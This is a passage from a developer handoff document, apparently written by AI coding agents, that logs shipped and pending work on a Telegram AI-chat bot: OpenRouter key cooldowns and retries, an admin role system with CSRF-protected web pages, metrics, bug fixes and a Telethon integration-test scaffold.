* ✅ **Pagination for very long buffers** — shipped in Stage-15-Step-E #1 follow-up #2. `conversation_export.format_history_as_text_multipart(rows, *, user_handle)` returns a list of `(text, kept_count_in_part)` pairs, packing whole messages into parts of up to `EXPORT_PART_MAX_BYTES` (1 MB) each and capping the export at `EXPORT_MAX_PARTS` (10) parts × `EXPORT_TOTAL_MAX_BYTES` (10 MB) total. Single-part exports return a one-element list with byte-for-byte identical output to the legacy `format_history_as_text` (no `Part:` line, legacy filename pattern) so the common small-buffer case is unchanged. Multi-part exports include a `Part: N/M` header line and use a `-part-NN-of-M.txt` filename suffix (zero-padded so file managers sort lexicographically in the right order). When the buffer exceeds the total budget, oldest messages are trimmed first (the trim header lands on part 1 only). The handler (`memory_export_handler` + `cmd_history`) sends each part as its own `answer_document` call with a per-part caption (`memory_export_caption_part`); the final callback toast announces the cross-part totals (`memory_export_done_multipart`).
* ✅ **Rate limiting** — shipped in the same follow-up. `cmd_history` consumes a token from the existing `consume_chat_token` bucket before hitting the DB; same throttle, same forgiveness window as the AI-chat path. The menu button stays unrate-limited (Telegram itself debounces callback queries).
* **Schema-rotation hook** — if the operator ever needs to comply with a "delete all my data" request, `Database.clear_conversation` already exists. Document that the export button is the user-facing read side and `mem_reset` is the user-facing delete side.

##### Stage-15-Step-E #4 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #4 (Rate limiting per OpenRouter key) — STARTED in PR-after-Step-E-#3.**

Original spec (Step-E table row 4): "extend `openrouter_keys.py` with per-key 429 detection. If a key gets rate-limited, temporarily redistribute its users to other keys. Current sticky assignment doesn't handle key exhaustion."

What's shipped this PR:

* `openrouter_keys.py` — extended with a per-key cooldown table (`_cooldowns: dict[api_key -> deadline_monotonic_seconds]`). New public surface:
    * `mark_key_rate_limited(api_key, retry_after_secs=None)` — put a key in cooldown. Defaults to 60s; honours an explicit Retry-After; clamps to `MAX_COOLDOWN_SECS=3600` so a misbehaving CDN sending `Retry-After: 86400` can't pin a key out for a day; falls back to the default on NaN / Inf / negative / non-numeric values; ignores stale references (keys not in the current pool) so the cooldown table doesn't grow unbounded; **never shortens** an already-running longer cooldown when a fresh 429 comes in with a smaller Retry-After (OpenRouter sometimes sends back-to-back 429s with different windows).
    * `is_key_rate_limited(api_key)` — membership check with lazy expiry (cooldowns past their deadline are dropped on read, so the table self-cleans without a background sweeper).
    * `available_key_count()` — number of pool keys not currently in cooldown. Used by the picker and the diagnostic snapshot.
    * `key_status_snapshot()` — per-key dict for ops dashboards / metrics with `index`, `rate_limited`, `cooldown_remaining_secs`. Deliberately does **not** leak the api_key string itself into the snapshot rows.
    * `clear_all_cooldowns()` — tests + ops "force everything back online" recovery.
* `key_for_user(telegram_id)` — selection policy now: (1) compute sticky idx, (2) if sticky key not in cooldown, return it, (3) otherwise walk forward through the pool returning the first available key, (4) if **every** key is in cooldown, return the sticky pick anyway (with a warning) so the user gets at least an attempt rather than a hard "all keys exhausted" error. The "walk forward" lets a 3-key pool absorb a single key going hot without any user seeing a 429.
* `ai_engine.chat_with_model` — on a 429 from OpenRouter, call `mark_key_rate_limited(api_key, retry_after_secs=...)` reading the upstream `Retry-After` header. Wrapped in a broad except so a parsing quirk in the response doesn't mask the user-facing 429 reply (the user still gets `ai_rate_limited` / `ai_rate_limited_free`, the cooldown side-effect is best-effort).
* 22 new tests in `tests/test_openrouter_keys.py` (per-key cooldown lifecycle: mark / is / fall-back / sticky-when-all-cooled / expiry / default vs explicit Retry-After / clamps excessive / falls back on NaN/Inf/non-numeric / keeps-longer / extends-to-longer / unknown-key-noop / empty-string-noop / available_key_count / clear_all_cooldowns / key_status_snapshot / single-key-pool fallback). 4 new tests in `tests/test_ai_engine.py` (429 marks key / Retry-After honoured / garbage Retry-After falls back / no Retry-After uses default).

What remains (next AI's TODO):

* **Cross-replica cooldown coordination** — current state is process-local. Two replicas of the bot will track their own cooldowns independently. For the first slice this is acceptable (60s default cooldown clears within minutes) but a real multi-replica deployment should park the cooldown table in Redis with a short TTL. Pattern: `_redis.setex(f"openrouter:cooldown:{api_key_hash}", retry_after_secs, "1")` and `_redis.exists(...)` for the membership check. Hash the api_key first so the Redis keyspace doesn't leak it.
* ✅ **`/admin/openrouter-keys` ops view** — shipped in Stage-15-Step-E #4 follow-up #1. Renders one row per pool key with cooldown status + remaining seconds + per-key 429 / fallback counters. Auth-gated like every other `/admin/*` page; no api_key strings ever leave the module (rows are referenced by 0-based pool index).
* ✅ **DB-backed key registry + CRUD UI** — shipped in Stage-15-Step-E #4 follow-up #2 (this PR). New `openrouter_api_keys` table (`alembic/versions/0017_openrouter_api_keys.py`) with `id` / `label` / `api_key` (UNIQUE) / `enabled` / `created_at` / `last_used_at` / `notes`. `Database.list_openrouter_keys` (returns 4-char `api_key_tail` only — never the plaintext), `list_enabled_openrouter_keys_with_secret` (loader-only), `add_openrouter_key` (validates label/api_key length, translates UNIQUE violations to `ValueError`), `set_openrouter_key_enabled`, `delete_openrouter_key`, `mark_openrouter_key_used`. `openrouter_keys.refresh_from_db(db)` merges env keys + enabled DB rows into the in-process pool, dedup'd against env, idempotent (no counter reset when the pool composition is unchanged), and fail-safe against a transient DB error (env pool stays in place). `/admin/openrouter-keys` GET now refreshes from DB on every render and shows the live pool (with new "name" / "source" / "requests" columns) plus a DB-management table with disable / enable / delete actions and an "add a key" form. Three new POST handlers (`/add`, `/{id}/{disable|enable}`, `/{id}/delete`), all CSRF-protected and audit-logged via `record_admin_audit` with `openrouter_key_add` / `openrouter_key_disable` / `openrouter_key_enable` / `openrouter_key_delete` slugs. **Bundled bug fix:** `openrouter_keys.key_for_user` previously bumped the per-key 429 / fallback counters but had no per-key request counter, so a "is this slot actually being used?" question could only be answered indirectly (via OpenRouter's dashboard). Added `_KEY_REQUEST_COUNTERS` keyed by pool index, bumped on every sticky pick + every fallback pick, surfaced as a new column in the panel. Tested in `tests/test_openrouter_keys.py::test_key_for_user_bumps_request_counter` and `..._bumps_on_fallback`. Total tests: 2343 (was 2296), +47 new tests covering the registry CRUD, the merge logic, the refresh idempotence, the CSRF / auth gates, and the `_command_count` helper.
* ✅ **Per-key Prometheus counters** — shipped in the same follow-up. `metrics.py` now emits three new families: `meowassist_openrouter_key_429_total{index="N"}` (counter), `meowassist_openrouter_key_fallback_total{index="N"}` (counter), and `meowassist_openrouter_key_cooldown_remaining_seconds{index="N"}` (gauge).
* ✅ **Per-key 24h usage / cost view** — shipped in Stage-15-Step-E #4 follow-up #3 (this PR). New module-level `_KEY_USAGE_BUCKETS: dict[int, list[(timestamp, cost_usd)]]` rolling buffer in `openrouter_keys.py`, with public async API `record_key_usage(api_key, cost_usd, *, db=None)` and snapshot reader `get_key_24h_usage() -> {idx: {requests, cost_usd}}`. The pre-existing `_KEY_REQUEST_COUNTERS` is process-start-relative (resets on restart, no time window); this new tracker maintains a 24-hour window that survives normal runtime variation. `ai_engine.chat_with_model` calls `record_key_usage(api_key, cost_for_key_tracker, db=db)` after every successful settlement (both free-message and paid branches — the panel's "24h reqs" answer is "what hit OpenRouter against this key", not "what we charged"); failures are logged & swallowed so the tracker can never block the user-facing AI reply. `web_admin.openrouter_keys_get` reads the snapshot and renders two new "24h reqs" / "24h cost" columns in the live-pool table. **Bundled bug fix:** the DB-backed registry's `last_used_at` column was never updated by the live AI path — only by tests — so the panel's "Last used" column always rendered `—` even for actively-used DB keys. `record_key_usage` now bumps `last_used_at` via `db.mark_openrouter_key_used(db_id)` for keys whose pool meta says `source == "db"`. Lazy expiry on read (24h cutoff trimmed when `get_key_24h_usage` is called); safety cap of 100,000 entries per index with amortized 10% eviction protects against runaway growth from a buggy caller. Reset on `load_keys()` and `reset_key_counters_for_tests()` alongside the existing 429/fallback/request counters so a key rotation doesn't carry stale meaning forward. Tested in `tests/test_openrouter_keys.py` (16 new tests covering append, reverse-lookup, NaN/-Inf cost handling, expiry, idx eviction, safety cap, DB-bump on `source==db`, env-key skip-bump, swallow-on-DB-error, load_keys reset, reset-for-tests reset), `tests/test_web_admin.py` (4 new tests covering header rendering, populated rows, zero-traffic rendering, 25h-old-entry exclusion), and `tests/test_ai_engine.py` (4 new tests covering paid-path recording, free-path recording, 429-skips-record, and tracker-failure-swallowed). Total tests: 2438 (was 2419), +19 net new tests.
* ~~**Retry the request itself with a different key**~~ ✅ **shipped (Stage-15-Step-E #4 follow-up #5 PR — one-shot retry on 429).** Pre-feature: a 429 from OpenRouter on the user's sticky key bounced back as `ai_rate_limited` even when a non-cooled alternate key in the pool would have served the request. Now: after the first 429 + `(key, model)` cooldown mark, `chat_with_model` asks the picker for the next key — if it's a different key from the first attempt, it retries the POST exactly **once** against the alternate. The retry is a single attempt (NOT a loop) so a pool-wide outage can't cascade into N retries × N cooldowns; latency cost is bounded to one extra `aiohttp.ClientSession.post` round-trip on the 429 path. Implementation extracts `_post_chat_completion(api_key, payload, timeout)` as a private helper inside `ai_engine.py` (returns `(status, headers, body_text, parsed_json)`) so the retry doesn't duplicate the 50+ lines of POST + response-parsing + error-logging the original inline block carried; the helper takes the api_key explicitly so the retry sends the alternate key in the `Authorization` header (verified in `tests/test_ai_engine.py::test_chat_429_retries_with_alternate_key_and_succeeds`). Outcome tracking lives in a new pool-wide aggregate counter `_ONE_SHOT_RETRY_COUNTERS` in `openrouter_keys.py` (deliberately *not* per-key — the retry is a user-session-level event, and per-key would explode the counter cardinality without adding signal). Six outcome labels — pinned alphabet `_ONE_SHOT_RETRY_OUTCOMES`: `attempted` (every retry — the denominator), `succeeded` (retry returned a 200 and the user got an AI reply), `second_429` (retry also rate-limited; both `(key, model)` pairs now cooled — surfaces "is the rate-limit pool-wide or per-key?"), `second_other_status` (retry returned a non-200 non-429 — 5xx, 401 from a key that just got revoked, etc; user sees `ai_provider_unavailable`), `transport_error` (retry POST raised `aiohttp.ClientError` / `TimeoutError`; outer `except Exception` surfaces `ai_transient_error`), `no_alternate_key` (single-key pool or all alternates already in cooldown for this model — no retry attempted, the user gets the existing rate-limit reply). `_increment_oneshot_retry(outcome)` rejects unknown labels (defence in depth: a typoed `succeded` would silently shift success counts into a phantom bucket the metrics layer would never render); `get_oneshot_retry_counters()` returns a defensive shallow copy. The reset hooks (`reset_key_counters_for_tests`, `load_keys`) wipe the new counter alongside the existing per-key ones so test isolation and operator key rotations both stay clean. `metrics.py` exposes the family as `meowassist_openrouter_oneshot_retry_total{outcome="…"}` — operators alert on `rate(meowassist_openrouter_oneshot_retry_total{outcome="second_429"}[5m]) / rate(meowassist_openrouter_oneshot_retry_total{outcome="attempted"}[5m]) > 0.5` ("the pool is hot enough that retries don't help — add another key"). HELP/TYPE preamble is rendered even with zero outcomes recorded so a fresh deploy's PromQL query doesn't return "metric does not exist". After a successful retry, `record_key_usage` is bumped against the *alternate* key (not the original cooled key) — without this rebinding the 24h-spend dashboard would credit the wrong key on every retry-success (pinned in `tests/test_ai_engine.py::test_chat_429_retry_succeeds_charges_correct_key`). 7 new tests in `tests/test_ai_engine.py` (succeeds-on-retry / second-429 / no-alternate-key / 5xx-on-retry / transport-error-on-retry / charges-correct-key / happy-path-doesn't-bump-counters), 6 new tests in `tests/test_openrouter_keys.py` (counter accessor starts empty / records each outcome / unknown-outcome-noop / snapshot-is-independent-copy / reset wipes / load_keys wipes), 2 new tests in `tests/test_metrics.py` (renders outcome label + count, empty-state preamble). Total test suite: 2583 → 2598 passing (+15).
* ✅ **Per-model rate-limit tracking** — shipped in Stage-15-Step-E #4 follow-up #4 (this PR). OpenRouter typically 429s a specific `:free` model whose upstream provider is throttling, not the API key as a whole. The first slice cooled the whole key on every 429 — that locked out paid models on the same key (e.g. a 429 on `google/gemini-2.0-flash-exp:free` blocked `anthropic/claude-3.5-sonnet` on the same key for the full 60s window). New behaviour: a second cooldown table keyed by `(api_key, model_id)` lives alongside the whole-key table. `mark_key_rate_limited(api_key, ..., model="<slug>")` writes to the per-(key, model) table; `mark_key_rate_limited(api_key, ...)` (no model kwarg) keeps the whole-key behaviour for callers without model context (or for "the key itself is dead" cases like 401 / 403). `is_key_rate_limited(api_key, model="<slug>")` returns True when EITHER table has an active entry; `key_for_user(uid, model="<slug>")` walks past slots blocked for `<slug>` while keeping slots blocked for *other* models on the same key. `available_key_count(model="<slug>")` reports availability for that specific model. `clear_all_cooldowns()`, `_drop_expired_cooldowns()`, and the `load_keys()` stale-eviction sweep all operate on both tables in lockstep so the per-model entries never out-live the whole-key table's rotation discipline. `ai_engine.chat_with_model` now passes `model=active_model` through to both `key_for_user` and `mark_key_rate_limited`. **Bundled bug fix:** the inline `float(retry_after)` in `chat_with_model` only handled the delta-seconds form of `Retry-After`; per RFC 7231 §7.1.3 the header can also be an HTTP-date and many CDNs (Cloudflare, Akamai, AWS CloudFront — all of which can sit in front of OpenRouter's edge) emit the date form. The date form fell through into the `ValueError` catch and silently used the default 60s cooldown — throwing away a real upstream signal in both directions (waiting longer than necessary on short throttles, shorter on long ones). New `_parse_retry_after(value)` helper handles both forms (RFC 1123 / RFC 850 / asctime via `email.utils.parsedate_to_datetime`), rejects past dates / NaN / Inf / negatives / non-positives so the caller falls back cleanly to the default. New per-(key, model) cooldown gauge family `meowassist_openrouter_key_model_cooldown_remaining_seconds{index="N",model="<slug>"}` in `metrics.py` — only emits a row per *active* (key, model) cooldown (not every cross product) so PromQL `> 0` queries don't pollute with sentinel zeros. Total tests: 2570 (was 2524), +46 new tests covering: `_normalise_model` edge cases (None / empty / whitespace / non-str / case-sensitivity / no-lowercasing), per-(key, model) marking + membership + expiry + lockstep pruning, dual-table semantics (whole-key OR per-model), picker walk past per-model-blocked slots, all-cooled fallback, snapshot determinism, snapshot rotation filtering, `_parse_retry_after` matrix (None / empty / whitespace / int / float / strip / zero / negative / NaN / Inf / garbage / HTTP-date in future / HTTP-date in past / malformed date), and the new metrics gauge family. Existing 429 tests in `test_ai_engine.py` updated to assert against `_per_model_cooldowns` instead of `_cooldowns` (the cooldown is now scoped to the active model, not the whole key — which is the intended behaviour change). What's NOT in this PR (deferred to a separate follow-up): one-shot retry on 429 with the next available key (still in the "what remains" list above), and the `/admin/openrouter-keys` UI rendering of the per-(key, model) cooldown table (the metric exposition and the snapshot helper land in this PR but the HTML rendering is left for the follow-up so this PR's diff stays focused).

##### Stage-15-Step-E #5 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #5 (Admin role system) — STARTED in PR-after-Step-E-#4.**

Original spec (Step-E table row 5): "currently all admins have full access. Add roles: viewer (read-only dashboard), operator (can broadcast, manage promos), super (can edit users, refund). Store in DB, not env."

What's shipped this PR:

* `alembic/versions/0016_admin_roles.py` — new `admin_roles` table:
    * `telegram_id BIGINT PRIMARY KEY`
    * `role TEXT NOT NULL CHECK (role IN ('viewer','operator','super'))` — typo-proof at the DB layer; a buggy SQL fix can't poison a row with `'opperator'` and degrade every gate to "unknown role → no access".
    * `granted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()`
    * `granted_by BIGINT NULL` — Telegram id of the granting admin; nullable so an env-list bootstrap / SQL seed row is allowed.
    * `notes TEXT NULL` — free-form rationale for the audit trail.
    * Indexed on `role` for the "list all operators" filter.
* `admin_roles.py` — new module owning the role hierarchy:
    * Constants `ROLE_VIEWER` / `ROLE_OPERATOR` / `ROLE_SUPER` and a `ROLE_ORDER` tuple (lowest → highest privilege) used as the index ordering for comparisons.
    * `normalize_role(raw)` — lowercase + strip + validate. Returns `None` for unknown inputs so callers can branch on a single sentinel.
    * `role_at_least(role, required)` — single chokepoint for every future gate. Fails closed on both sides: an unknown / `None` *role* always returns `False` ("we couldn't determine your role" must NEVER mean "you have access"); an unknown / mistyped *required* also returns `False` so a typo in the call-site doesn't accidentally match every input.
    * `effective_role(telegram_id, db_role, *, is_env_admin)` — resolution helper. DB role wins when valid; otherwise an env-listed Telegram id resolves to `super` for backward-compat; otherwise `None`. A corrupted `db_role` value (e.g. left over from a manual SQL fix that pre-dated the CHECK) falls through to the env-list branch rather than locking the legacy admin out — fail-soft beats fail-closed when the operator is actively recovering from a bad SQL fix.
* `Database.get_admin_role` / `set_admin_role` / `delete_admin_role` / `list_admin_roles` — the CRUD surface. `set_admin_role` validates against `Database.ADMIN_ROLE_VALUES` *before* hitting the DB so a typo gets a clean `ValueError` rather than the asyncpg `CheckViolationError` the SQL CHECK would raise on the wire (which is harder for upstream callers to discriminate from a transient DB error). `granted_at` is reset to `NOW()` on every UPSERT so the value always reflects the most recent change. `list_admin_roles` clamps `limit` into [1..1000] so a buggy caller can't OOM the formatter.
* `admin.admin_role_grant` / `admin_role_revoke` / `admin_role_list` — three new Telegram commands gated to env-list `is_admin` (NOT to a DB-tracked role; otherwise a viewer could promote themselves to super by virtue of having a row in the table). All three audit-log via `record_admin_audit` with action slugs `role_grant` / `role_revoke` / (no log on the read-only `role_list`); the audit insert is best-effort wrapped in `try/except` so a transient `admin_audit_log` write failure doesn't regress the user-visible success message.
* `_format_role_row` Markdown formatter routes `notes` through `_escape_md` so a free-form `stuck_invoice`-style string can't break the message render the way PR #50 documented.
* The `/admin` hub message lists all three new commands.
* 16 new tests in `tests/test_admin_roles.py` (role-order invariants, `normalize_role` accept/reject, `role_at_least` ordering + fail-closed on both sides, `effective_role` env-list backward-compat / DB role wins / corrupted `db_role` fallback / `None` telegram_id sentinel / case-normalisation).
* 11 new tests in `tests/test_database_queries.py` (get/set/delete/list lifecycle: happy paths, casing-normalisation, validator-rejects-typo-without-DB-roundtrip, NULL granted_by, UPSERT shape with `granted_at = NOW()` on UPDATE, command-tag parsing for the `DELETE 1` vs `DELETE 0` discriminator, defence-in-depth for unexpected command tags, limit clamping in both directions).
* 13 new tests in `tests/test_admin.py` (router exposes the three new commands, hub text lists them, `_format_role_row` happy + escapes Markdown + omits optional fields, handler smoke tests via mocked Message + db: non-admin no-op, invalid-role rejection without DB write, non-int user-id rejection, write-through to DB with audit hook, audit-failure-doesn't-block-success, revoke happy + not-found paths, list happy + empty-table path).
* README.md and HANDOFF.md updated.

What remains (next AI's TODO):

* ~~**Wire `role_at_least` into the existing admin command gates.**~~ ✅ **shipped in Stage-15-Step-E #5 follow-up #1 (role-gates wiring PR).** `admin._resolve_actor_role` (DB lookup → env-list fallback) + `admin._require_role(message, required)` now gate every Telegram-side admin handler. Per-handler floors: `/admin_metrics` and `/admin_balance` at `viewer`; `/admin_broadcast` at `operator`; `/admin_credit`, `/admin_debit`, and the entire `/admin_promo_*` family at `super`. The `/admin_role_*` handlers stay env-list-only (a DB-tracked super must NOT be able to self-promote out of the role table). The `/admin` hub message is rendered by `_render_admin_hub(role, is_env_admin=...)` and only lists rows the actor can actually drive — so a viewer typing `/admin` sees `/admin_metrics` and `/admin_balance` only, not `/admin_credit`. 17 new regression tests in `tests/test_admin.py`: the parametrised `test_admin_handlers_respect_role_floor` walks every (role × handler) cell of the matrix and pins both directions (the floor-and-above runs, every strictly-lower role silent-no-ops). Plus dedicated tests for the env-list backward-compat fallback when the DB pool fails (a transient pool error must NOT downgrade a legacy admin from super → None mid-incident), DB-role-wins-over-env-list, no-from-user defence in depth, and the role-CRUD-stays-env-list invariant.
* ~~**Add `/admin/roles` web page** mirroring the Telegram CLI.~~ ✅ **shipped in Stage-15-Step-E #5 follow-up #2 (this PR).** Browser counterpart to the `/admin_role_*` triplet: `GET /admin/roles` lists every DB-tracked grant (telegram id, role badge, granted-at, granted-by, notes, revoke button); `POST /admin/roles` writes a grant via `Database.set_admin_role`; `POST /admin/roles/{telegram_id}/revoke` drops the row via `Database.delete_admin_role`. Same auth as the rest of the panel (`ADMIN_PASSWORD`-gated cookie). Both write paths CSRF-protected via `verify_csrf_token` and audit-logged via `_record_audit_safe` with the existing `role_grant` / `role_revoke` slugs (already in `AUDIT_ACTION_LABELS`, so they show up in the `/admin/audit` filter dropdown without a follow-up patch). Form validation rejects empty / non-positive telegram ids, invalid role names (via `admin_roles.normalize_role`), and notes longer than 500 characters; failures surface a flash banner instead of silently no-op-ing. Per-user web auth (telegram-id-keyed credentials) remains the larger redesign called out in `bullet below — not in scope. **Bundled bug fix:** `Database.set_admin_role` now strips U+0000 NUL bytes from the `notes` argument before INSERT, mirroring the Stage-15-Step-E #10 fix on `append_conversation_message` (PR #128). Postgres TEXT rejects `\x00` outright with `invalid byte sequence for encoding "UTF8": 0x00`; the new web textarea is the surface most likely to hit this (an admin pasting from a binary file), but `/admin_role_grant`'s Telegram path also benefits — a NUL-bearing note used to demote the whole grant to a misleading "DB write failed — see logs" error. Strip-and-warn at the DB layer keeps the rest of the note text and logs the strip count loud-and-once for ops triage. **24 new tests** (21 in `tests/test_web_admin.py` covering auth gate / empty state / row rendering / DB error / sidebar nav / happy-path grant + revoke / CSRF protection / every validation branch / DB-error surfacing / noop revoke audit; 3 in `tests/test_database_queries.py` covering NUL strip + log warn / non-NUL passthrough / None notes early-out).
* ~~**Wire role gates into the web admin panel.**~~ ✅ **shipped in Stage-15-Step-E #5 follow-up #4 (this PR).** The web panel now mirrors the Telegram-side role gates via a new `_require_role(required: str)` decorator factory that wraps `_require_auth` and reads a signed view-as cookie. Per-route floors match the Telegram side: viewer-readable list / detail / dashboard pages stay on `_require_auth`; `operator` floor on broadcast enqueue/cancel and gift / promo create+revoke; `super` floor on user-wallet adjust, user-field edit, transaction refund, openrouter-keys add/toggle/delete, admin-roles grant/revoke, AI-model + gateway toggles, and every destructive `/admin/control/*` action. Below-floor requests 302 to `/admin/` with a flash banner ("That action requires super role — you are previewing as viewer …") and a `view_as_deny` audit row capturing path + method + required + view-as for forensic review. **The "view as <role>" toggle:** new `sign_view_as_cookie()` / `verify_view_as_cookie()` HMAC-SHA256 helpers with domain separation (HMAC prefix `viewas:`) so a forged auth-cookie HMAC can't replay as a view-as override and vice-versa; `verify_view_as_cookie` mirrors `verify_cookie`'s fail-soft posture (malformed / tampered / unknown role → `None` → falls back to `super` rather than crashing on a stale cookie post-secret-rotation). New `POST /admin/view-as` endpoint (CSRF-protected, audit-logged, allow-listed `next=/admin/...` to prevent open-redirect abuse) sets the cookie via `set_cookie` (path=/admin/, HttpOnly, Lax, max-age = TTL hours); selecting `super` deletes the cookie outright so a session-secret rotation never leaves a stale signed value behind. The toggle widget renders on every page via a new `_template_globals` async context processor (registered after `admin_auth_middleware` so it can read the middleware-stamped `request[REQUEST_KEY_VIEW_AS]` — middleware-ordering pin in a comment). New audit slugs `view_as_change` / `view_as_deny` added to `AUDIT_ACTION_LABELS`. **Bundled bug fix:** `sign_cookie` now rejects timezone-naive `expires_at` outright. `datetime.astimezone(tz)` on a naive datetime silently coerces it via the deploy host's *system local time*, producing a cookie expiry that depends on the host's `TZ` env — same naive `datetime(2099, 1, 1)` becomes different ISO strings on a UTC vs. a UTC-7 box. Production callers always pass aware datetimes, but the writer-side guard closes the loop with `verify_cookie`'s naive-ISO rejection (already in place since Stage-8) so a future regression that drops `tzinfo=timezone.utc` at a callsite fails loudly instead of silently minting host-dependent cookies. **33 new tests** in `tests/test_web_admin.py`: round-trip per role, malformed/tampered/wrong-secret/unknown-role cookie rejection, domain-separation pin (auth-cookie HMAC ≠ view-as HMAC), open-redirect block, role-gate audit pins, layout-renders-widget pin, plus a module-level pin walking `setup_admin_routes` source to assert the highest-risk routes (user adjust/edit, transaction refund, control destructives, openrouter CRUD, roles CRUD) are wrapped in `_require_role(ROLE_SUPER)` so a regression that drops a gate fails immediately. **Per-user web auth** (replacing the single `ADMIN_PASSWORD` with telegram-id-keyed credentials) remains the larger redesign — see bullet below.
* **Per-user web auth** — replace the single `ADMIN_PASSWORD` with per-admin Telegram-id-keyed credentials so the role system actually applies to the browser surface. This is the multi-week piece the original Step-E table row 5 calls out as "high effort"; it needs OAuth/SSO discussion with the operator first.
* ~~**First-login auto-promote of `ADMIN_USER_IDS` admins to a real `admin_roles` row.**~~ ✅ **shipped in Stage-15-Step-E #5 follow-up #3 (this PR).** New helper `admin_roles.ensure_env_admins_have_roles(db, admin_ids)` runs from the boot path in `main.main()` after `db.init` and the disabled-toggle warmup. For each id in `parse_admin_user_ids(os.getenv("ADMIN_USER_IDS"))`, it checks `db.get_admin_role(id)`; if the row is absent it UPSERTs a `super` row with `granted_by=None` and `notes="auto-promoted from ADMIN_USER_IDS at boot"`. Defensive contract: never **downgrade** (an existing DB role for an env-list user — e.g. an `operator` left there by a super demoting them but keeping the env entry as a safety net — is preserved); never **escalate non-env users** (only ids in the env list are touched); never **block boot** (any DB error is logged and bypassed; the env-list fallback in `effective_role` keeps working until the next boot); never **auto-promote non-positive ids** (Telegram never issues 0 / negative user ids, so a typo there is silently dropped). Returns a counter dict `{promoted, skipped_existing, skipped_invalid, errors}` so the boot log surfaces "we promoted N admins this boot" without re-querying. **Idempotent:** the second boot finds the rows from the first and bumps `skipped_existing` instead of rewriting. **Bundled bug fix:** `parse_admin_user_ids` now drops non-positive integer entries with a logged WARN. Pre-fix, a typo (`ADMIN_USER_IDS=123,-456`) or accidental chat-id paste would silently put a never-matchable row in the admin set; with the new auto-promote layered on top, the same typo would also seed a bogus `admin_roles` row in the DB. Drop them at parse time so every downstream consumer (`is_admin`, `_resolve_actor_role`, the new auto-promote) sees a clean set. 11 new tests in `tests/test_admin_roles.py` covering: promote-missing happy path, **doesn't downgrade** an existing operator/viewer, idempotent on second call, skips non-positive (-5, 0), skips non-int (None, "not-a-number") + zero-coerce, get_admin_role failure isolation, set_admin_role failure isolation, dedupes input, empty-input no-op, custom-notes pass-through, plus the `parse_admin_user_ids` non-positive regression pin.

Bundled bug fix in this PR (real, found during code review of the audit-page wiring): **`Database.list_admin_audit_log` and `Database.list_payment_status_transitions` now decode JSONB `meta` columns through a new `_decode_jsonb_meta(...)` helper instead of `dict(r["meta"])`.** Pre-fix, both readers ran `dict(r["meta"]) if r["meta"] is not None else None`. asyncpg returns JSONB columns as raw `str` by default (no codec is registered on the pool — see the audit + payment-status writers, which all hand-cast `$N::jsonb` from a `json.dumps`-rendered string), so `dict("...JSON string...")` raised `ValueError: dictionary update sequence element #0 has length 1; 2 is required` for every non-empty meta. The audit-page handler (`web_admin.audit_get`) wraps the read in `try/except` and renders "Database query failed" on any exception, so the regression was *silent* in production — the operator looking at `${WEBHOOK_BASE_URL}/admin/audit` would see an empty error tile instead of the per-action audit trail the moment the table grew its first non-NULL `meta` row (which is most rows: every login attempt records `{"reason": "..."}`, every wallet adjustment records `{"delta_usd": ...}`, etc.). The new helper accepts `None` / `dict` / `str` / `bytes` cleanly and demotes any unparseable row's `meta` to `None` (with a logged WARNING) so a single poisoned row can't blank the entire feed. Confirmed locally with a real asyncpg connection against a Postgres 16 container. 5 new tests in `tests/test_database_queries.py` pin both the JSONB-`str` decode path (regression pin), the dict pass-through (forward-compat for a future `set_type_codec` registration), the corrupted-row-doesn't-blank-feed semantics, and the matching `list_payment_status_transitions` site (same shape, same regression — one helper call site, one fix).

---

##### Stage-15-Step-E #6 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #6 (Automated testing with real Telegram) — STARTED in PR-after-Step-E-#5.**

Original spec (Step-E table row 6): "use telethon or pyrogram to write integration tests that actually send messages to the bot and verify responses. Currently all tests are unit tests with mocked Telegram."

What's shipped this PR:

* `requirements-dev.txt` adds `telethon>=1.36,<2`. Pinned upper bound because telethon ships breaking changes on the regular and we don't want a surprise major-version bump to break the unit-test path.
* `tests/integration/__init__.py` — marks the directory as a package so pytest's discovery picks it up under `testpaths = tests`.
* `tests/integration/conftest.py` — the **scaffold**:
    * `_SECRET_VARS` tuple lists the four required env vars: `TG_API_ID`, `TG_API_HASH`, `TG_TEST_SESSION_STRING`, `TG_TEST_BOT_USERNAME`.
    * `integration_secrets` (session-scoped fixture) calls `pytest.skip(...)` listing the missing vars, so a CI run with no secrets emits clean `SKIPPED [reason]` lines and stays green. The skip happens at *fixture-resolution* time, not import time, so the test files still get *collected* (and lint / static analysis still see them) when secrets are missing — only the actual run is short-circuited.
    * `telegram_client` (session-scoped, async) — connected, logged-in Telethon `TelegramClient`. Imports telethon *inside* the fixture so a production-only `pip install -r requirements.txt` (no dev deps) cleanly skips the suite rather than raising `ImportError` at collection time.
    * `send_and_wait` — the polling helper. Sends a message, sleeps `TG_TEST_SETTLE_SECONDS` (default 0.5s, configurable) to let the bot's long-poller catch up, then `iter_messages(min_id=sent.id)` until the next reply arrives. Bounded by `TG_TEST_TIMEOUT_SECONDS` (default 15s). Raises `asyncio.TimeoutError` (NOT `pytest.fail`) on timeout so individual tests can opt to catch the timeout — used by the "unknown command doesn't crash the bot" test, which actively *expects* the bot to be silent and just verifies the next legitimate command still works.
* `tests/integration/test_smoke.py` — four smoke tests:
    * `/start` returns *some* reply (alive + reachable + long-poller running).
    * `/start` posts a hub message with `reply_markup` (the inline keyboard renders).
    * `/balance` reply contains `$` (wallet template renders the balance line).
    * Unknown command doesn't wedge the bot — followup `/start` still responds.
* `.env.example` documents the four secrets + the two optional timeout knobs with a step-by-step setup walkthrough (the throwaway script that generates the session string lives in `conftest.py` so the operator can copy-paste).
* README.md and HANDOFF.md updated.
* CI is unaffected: `pytest -v` collects 4 integration tests and skips all of them with a clear "missing env var(s) ..." reason. The existing 1549 unit tests still run normally.

What remains (next AI's TODO):

